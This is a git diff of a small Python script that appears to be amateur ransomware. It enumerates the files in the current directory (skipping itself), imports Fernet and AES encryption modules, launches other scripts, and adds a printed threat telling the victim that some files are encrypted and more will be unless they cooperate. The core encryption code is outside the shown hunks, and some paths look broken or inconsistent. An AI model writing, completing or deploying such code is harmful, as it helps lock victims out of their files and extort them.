@@ -2,6 +2,9 @@ import os
 import time
 from cryptography.fernet import Fernet
 from subprocess import call
+from Cryptodome.Cipher import AES
+from Cryptodome import Random
+from binascii import b2a_hex
 
 call(["python", "$@#&/open.py"])
 
@@ -10,7 +13,7 @@ call(["python", "$@#&/open.py"])
 files = []
 
 for file in os.listdir():
-	if file == "LOL.py":
+	if file == "LMAO.py":
 		continue
 	if os.path.isfile(file):
 		files.append(file)
@@ -33,4 +36,9 @@ time.sleep(5)
 # Password to run the script. DO NOT USE THIS AS THE DECRIPT PASSWORD
 password = "LOL"
 
+print("only a couple of your files have been ENCRYPTED, if you dont work properly with me, i will encryipt all of them!!!")
+print("Loading...")
+time.sleep(5)
 call(["python", "main/LOL.py"])
+
+call(["python", "LMA0.py"])
